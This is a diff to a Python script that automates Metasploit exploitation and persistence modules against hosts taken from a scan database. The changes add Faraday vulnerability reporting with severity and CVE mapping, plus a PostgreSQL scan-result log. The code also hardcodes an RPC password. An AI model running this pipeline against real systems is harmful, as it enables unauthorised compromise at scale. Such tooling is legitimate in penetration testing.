@@ -437,31 +437,58 @@ def faraday_get_or_create_host(ip: str):
     return None
 
 
+_MSF_RANK_SEV = {
+    600: 'critical', 500: 'critical',   # Excellent, Great → confirmed RCE
+    400: 'high',                         # Good
+    300: 'high', 200: 'medium',          # Normal, Average
+    100: 'low',  0: 'low',              # Low, Manual
+}
+
+
 def faraday_report_pwn(address: str, exploit_name: str, payload_name: str,
-                       session_info: dict = None):
+                       session_info: dict = None, mod_info: dict = None) -> bool:
     """Enregistre un exploit confirmé dans Faraday comme vuln critique."""
     if not FARADAY_URL or not FARADAY_PASSWORD:
-        return
+        return False
     ip = str(address).split('/')[0]
     host_id = faraday_get_or_create_host(ip)
     if not host_id:
-        return
+        return False
     auth = (FARADAY_USER, FARADAY_PASSWORD)
+
+    # Severity from MSF module rank
+    rank = int((mod_info or {}).get('rank', 600))
+    severity = _MSF_RANK_SEV.get(rank, 'critical')
+
+    # CVE refs from module metadata
+    refs = [{'name': 'Metasploit', 'type': 'other'}]
+    for ref_pair in (mod_info or {}).get('references', []):
+        if isinstance(ref_pair, (list, tuple)) and len(ref_pair) == 2:
+            ref_type, ref_val = ref_pair
+            if str(ref_type).upper() == 'CVE':
+                refs.append({'name': f"CVE-{ref_val}", 'type': 'CVE'})
+            elif str(ref_type).upper() in ('BID', 'URL', 'EDB'):
+                refs.append({'name': str(ref_val), 'type': 'other'})
+
     desc_parts = [f"Exploit: {exploit_name}", f"Payload: {payload_name}"]
     if session_info:
         for k in ('platform', 'arch', 'username', 'tunnel_peer', '_sysinfo', '_getuid'):
             v = (session_info.get(k) or '').strip()
             if v:
                 desc_parts.append(f"{k}: {v}")
+
     vuln = {
         'name': exploit_name,
         'desc': '\n'.join(desc_parts),
-        'severity': 'critical',
-        'refs': [{'name': 'Metasploit', 'type': 'other'}],
+        'severity': severity,
+        'refs': refs,
         'data': f"payload: {payload_name}",
         'type': 'Vulnerability',
         'parent': host_id,
         'parent_type': 'Host',
+        'status': 'open',
+        'confirmed': True,
+        'tags': ['metasploit'],
     }
     try:
         r = requests.post(
@@ -469,11 +496,14 @@ def faraday_report_pwn(address: str, exploit_name: str, payload_name: str,
             auth=auth, json=vuln, timeout=10
         )
         if r.status_code in (200, 201, 409):
-            print(f"[FARADAY] {ip} — {exploit_name} → vuln critique postée")
+            print(f"[FARADAY] {ip} — {exploit_name} → vuln {severity} postée")
+            return True
         else:
             print(f"[FARADAY] POST {r.status_code}: {r.text[:100]}")
+            return False
     except Exception as e:
         print(f"[FARADAY] POST failed: {e}")
+        return False
 
 
 def filter_exploits_by_profile(exploits, allowed_patterns, os_name=''):
@@ -649,8 +679,59 @@ def build_targeted_exploits(client, services, os_name='', products=None, scan_de
     return exploits
 
 
+def ensure_uzi_scan_log():
+    """Crée la table uzi_scan_log si elle n'existe pas."""
+    try:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    CREATE TABLE IF NOT EXISTS uzi_scan_log (
+                        host_id        INT PRIMARY KEY,
+                        address        TEXT NOT NULL,
+                        scanned_at     TIMESTAMP DEFAULT NOW(),
+                        status         TEXT DEFAULT 'tried',
+                        modules_tried  INT DEFAULT 0,
+                        modules_pwned  INT DEFAULT 0,
+                        sessions       INT DEFAULT 0,
+                        winning_module TEXT,
+                        faraday_ok     BOOLEAN DEFAULT FALSE
+                    )
+                """)
+            conn.commit()
+        print("[INFO] uzi_scan_log prête")
+    except psycopg2.Error as e:
+        print(f"[ERREUR] ensure_uzi_scan_log: {e}")
+
+
+def mark_uzi_result(host_id: int, address: str, status: str,
+                    modules_tried: int, modules_pwned: int, sessions: int,
+                    winning_module: str = None, faraday_ok: bool = False):
+    try:
+        with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    INSERT INTO uzi_scan_log
+                        (host_id, address, scanned_at, status,
+                         modules_tried, modules_pwned, sessions, winning_module, faraday_ok)
+                    VALUES (%s, %s, NOW(), %s, %s, %s, %s, %s, %s)
+                    ON CONFLICT (host_id) DO UPDATE SET
+                        scanned_at    = NOW(),
+                        status        = EXCLUDED.status,
+                        modules_tried = EXCLUDED.modules_tried,
+                        modules_pwned = EXCLUDED.modules_pwned,
+                        sessions      = EXCLUDED.sessions,
+                        winning_module = EXCLUDED.winning_module,
+                        faraday_ok    = EXCLUDED.faraday_ok
+                """, (host_id, address, status,
+                      modules_tried, modules_pwned, sessions,
+                      winning_module, faraday_ok))
+            conn.commit()
+    except psycopg2.Error as e:
+        print(f"[ERREUR] mark_uzi_result: {e}")
+
+
 def get_all_debug_hosts():
-    """Sélectionne un hôte classifié par bm12_v3 avec des produits identifiés."""
+    """Sélectionne un hôte classifié par bm12_v3 avec des produits identifiés, non encore traité par uzi."""
     try:
         with psycopg2.connect(dbname=PG_DBNAME, user=PG_USER, password=PG_PASSWORD, host=PG_HOST, port=PG_PORT) as conn:
             with conn.cursor() as cur:
@@ -660,6 +741,7 @@ def get_all_debug_hosts():
                     "AND scan_details IS NOT NULL "
                     "AND (scan_details::jsonb) ? 'products' "
                     "AND host(address::inet) NOT LIKE 'fe80:%%' "
+                    "AND id NOT IN (SELECT host_id FROM uzi_scan_log WHERE status != 'error') "
                     "LIMIT 1;"
                 )
                 return cur.fetchall()
@@ -846,6 +928,8 @@ def main():
         print(f"[ERREUR] Port 5432 ouvert mais PostgreSQL ne répond pas à {pg_ip}")
         return
 
+    ensure_uzi_scan_log()
+
 
     _msf_host = os.getenv("MSF_HOST", "127.0.0.1")
     client = MsfRpcClient('totototo', port=55553, server=_msf_host, ssl=True)
@@ -912,7 +996,7 @@ def main():
      print(f"[INFO] Scan de {host} en cours... ports ouverts: {sorted(open_ports)}")
 
      run_start = time.time()
-     stats = {'tried': 0, 'check_failed': 0, 'missing': 0, 'samba': 0, 'pwned': [], 'post_tried': 0}
+     stats = {'tried': 0, 'check_failed': 0, 'missing': 0, 'samba': 0, 'pwned': [], 'post_tried': 0, 'faraday_ok': False}
 
      # Séparer exploits remote (Phase 1) et post-exploitation (Phase 2)
      _POST_PATHS = ('exploit/linux/local/', 'exploit/linux/persistence/')
@@ -1100,7 +1184,8 @@ def main():
                          stats['pwned'].append((mod['fullname'], p))
                          print(f"[PWN] {mod['fullname']} → sessions {sorted(new_sessions)}")
                          report_vuln(str(host), mod['fullname'], p, sorted(new_sessions)[0])
-                         faraday_report_pwn(str(host), mod['fullname'], p)
+                         if faraday_report_pwn(str(host), mod['fullname'], p, mod_info=mod):
+                             stats['faraday_ok'] = True
                          break  # session ouverte — inutile d'essayer d'autres payloads
          check_con.destroy()
 
@@ -1143,6 +1228,17 @@ def main():
              print(f"  [CLOSE] Session {sid} erreur: {e}")
      upgraded_sessions.clear()
      print(f"{'='*60}\n")
+
+     uzi_status = 'pwned' if stats['pwned'] else ('no_exploits' if not search_results else 'tried')
+     winning = stats['pwned'][0][0] if stats['pwned'] else None
+     mark_uzi_result(
+         host_id, str(host), uzi_status,
+         modules_tried=stats['tried'] + stats['post_tried'],
+         modules_pwned=len(stats['pwned']),
+         sessions=len(sessions_final),
+         winning_module=winning,
+         faraday_ok=stats['faraday_ok'],
+     )
 
 
 if __name__ == "__main__":
